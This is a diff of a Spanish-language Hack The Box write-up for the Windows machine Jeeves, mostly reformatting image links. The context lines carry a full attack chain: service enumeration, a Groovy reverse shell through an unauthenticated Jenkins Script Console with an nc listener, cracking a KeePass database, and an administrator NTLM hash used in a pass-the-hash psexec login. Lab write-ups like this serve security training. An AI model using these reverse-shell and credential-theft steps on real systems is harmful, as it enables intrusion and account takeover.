@@ -2,12 +2,14 @@ ___
 Tags: #medium #jeeves
 ___
 # Jeeves
+
 ## Información General
 
-**- Dificultad:** Medium
-**- Sistema operativo:** Windows
-**- Fecha de resolución:** 22/08/2026
+**- Dificultad:** Medium <br>
+**- Sistema operativo:** Windows <br>
+**- Fecha de resolución:** 22/08/2026 <br>
 **- Enlace:** [Jeeves](https://app.hackthebox.com/machines/Jeeves)
+
 ## Listado de Vulnerabilidades Identificadas
 
 - **Consola de Scripting Expuesta en Jenkins (Sin Autenticación)**
@@ -37,6 +39,7 @@ ___
 ## Reconocimiento
 
 **HTB** nos proporciona la ip de la máquina objetivo **10.129.228.112**
+
 ### Ping
 
 Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:
@@ -45,10 +48,14 @@ Dependiendo del resultado podemos deducir si es una máquina linux o window, por
 ping -c 1 10.129.228.112
 ```
 
-![[Jeevesping.png]]
+<p align="center">
+<img src="images/Jeevesping.png" width="600" alt="Resultado de Nmap">
+</p>
 
 **Su ttl es 128. Por tanto, es Windows**
+
 ## Enumeración
+
 ### Escaneo de puertos abiertos
 
 #### Escaneo de puerto TCP
@@ -84,10 +91,13 @@ Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 El servidor web devuelve un motor de búsqueda con apariencia de "Pregunta a Jeeves":
 
-![[Jeevesweb80.png]]
+<p align="center">
+<img src="images/Jeevesweb80.png" width="600" alt="Resultado de Nmap">
+</p>
 
 nada interesante
-### SMB 
+
+### SMB
 
 El usuario **guest** está deshabilitado.
 
@@ -95,10 +105,16 @@ El usuario **guest** está deshabilitado.
 netexec smb 10.129.228.112 -u guest -p ''
 ```
 
-![[Jeevesguestrsmb.png]]
+<p align="center">
+<img src="images/Jeevesguestrsmb.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ### Sitio web - TCP 50000
 
-![[Jeeves50000.png]]
+<p align="center">
+<img src="images/Jeeves50000.png" width="600" alt="Resultado de Nmap">
+</p>
+
 #### Gobuster
 
 ```
@@ -107,14 +123,18 @@ gobuster dir -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirbuster/d
 
 > /askjeeves
 
-![[Jeevesaskjevbes.png]]
+<p align="center">
+<img src="images/Jeevesaskjevbes.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Tarda bastante en conseguirlo.
-#### Fuzzing web 
+
+#### Fuzzing web
 
 ```
 wfuzz -c --hc 404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/FUZZ
 ```
+
 ### /askjeeves/ - TCP 50000
 
 Esta página es un ejemplo de Jenkins.
@@ -122,6 +142,7 @@ Esta página es un ejemplo de Jenkins.
 ```
 http://10.129.228.112:50000/askjeeves/
 ```
+
 ## Explotación
 
 ### Shell como kohsuke
@@ -130,7 +151,9 @@ http://10.129.228.112:50000/askjeeves/
 
 Para obtener una reverse shell desde jenkins nos iremos a **Manage Jenkins** - **Script Console**, el comando me ayudo crearlo la IA
 
-![[Jeevespayloadreverseshell.png]]
+<p align="center">
+<img src="images/Jeevespayloadreverseshell.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 String host = "10.10.14.188"
@@ -164,7 +187,10 @@ sudo rlwrap -cAr nc -lvnp 4450
 
 Y obtenemos la flag de **user.txt**
 
-![[Jeevesuser.txt.png]]
+<p align="center">
+<img src="images/Jeevesuser.txt.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ## Escalada de Privilegios
 
 ### Shell as Administrator
@@ -175,13 +201,17 @@ Antes desde jeekins debemos de crearnos un repo, los pasos son:
 
 Le damos **New Item**
 
-![[Jeevesnewitem.png]] 
+<p align="center">
+<img src="images/Jeevesnewitem.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Le ponemos nombre y señalamos el apartado **Freestyle project**, luego guardamos.
 
 Investigando dentro del documento del usuario **kohsuke** nos encontramos un archivo keepass **CEH.kdbx**. 
 
-![[Jeevescehkdbxadsadklafma.png]]
+<p align="center">
+<img src="images/Jeevescehkdbxadsadklafma.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Por tanto, en la ruta copiaremos ese archivo en la ruta donde se creo el repositorio.
 
@@ -191,7 +221,9 @@ copy CEH.kdbx C:\Users\Administrator\.jenkins\workspace\empe1
 
 Luego en el navegador nos encontramos el archivo **CEH.kdbx**
 
-![[Jeevescejhajeekinsajdfsñ.png]]
+<p align="center">
+<img src="images/Jeevescejhajeekinsajdfsñ.png" width="600" alt="Resultado de Nmap">
+</p>
 
 #### Extraer contraseñas
 
@@ -199,7 +231,9 @@ Luego en el navegador nos encontramos el archivo **CEH.kdbx**
 keepass2john CEH.kdbx > CEH.kdbx.hash
 ```
 
-![[Jeevescehkeahasjdas.png]]
+<p align="center">
+<img src="images/Jeevescehkeahasjdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Lo único que editamos el archivo, y quitamos el **CEH:** del principio, quedaría tal que así:
 
@@ -219,7 +253,9 @@ kpcli --kdb CEH.kdbx
 find .
 ```
 
-![[Jeevesfiiiind.png]]
+<p align="center">
+<img src="images/Jeevesfiiiind.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El que me dio algo valido fue el **0**
 
@@ -227,7 +263,9 @@ El que me dio algo valido fue el **0**
 show -f 0
 ```
 
-![[Jeevescredecnuiialsda.png]]
+<p align="center">
+<img src="images/Jeevescredecnuiialsda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 #### Validación de cred
 
@@ -237,7 +275,9 @@ Validé que esto era el hash del usuario **administrator**
 crackmapexec smb 10.129.228.112 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
 ```
 
-![[Jeevesvalidacionadminsitrator.png]]
+<p align="center">
+<img src="images/Jeevesvalidacionadminsitrator.png" width="600" alt="Resultado de Nmap">
+</p>
 
 #### Shell
 
@@ -247,10 +287,12 @@ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81f
 
 El comando **`dir /R`** sirve para mostrar todos los archivos de un directorio **incluyendo sus flujos de datos alternativos (ADS - Alternate Data Streams)** en sistemas de archivos NTFS.
 
-![[Jeevesroot.txt.png]]
+<p align="center">
+<img src="images/Jeevesroot.txt.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Recuerda que para que te acepte esta flag tiene que poner esta estructura `HTB{...}`
+
 ## Conclusión
 
 La máquina **Jeeves** es un sistema Windows cuyo compromiso inicial se logra al descubrir un panel de Jenkins no autenticado expuesto en un puerto alternativo (50000/TCP), el cual permite la ejecución remota de código en Groovy mediante su consola de scripts para obtener acceso como el usuario `kohsuke`; posteriormente, la escalada de privilegios se realiza al hallar una base de datos KeePass (`CEH.kdbx`) accesible en el sistema, cuya clave maestra se obtiene por fuerza bruta para extraer el hash NTLM del Administrador y efectuar un ataque de _Pass-the-Hash_ vía SMB, concluyendo con la localización de la bandera final oculta dentro de un flujo alternativo de datos (ADS) en el escritorio del Administrador.
-
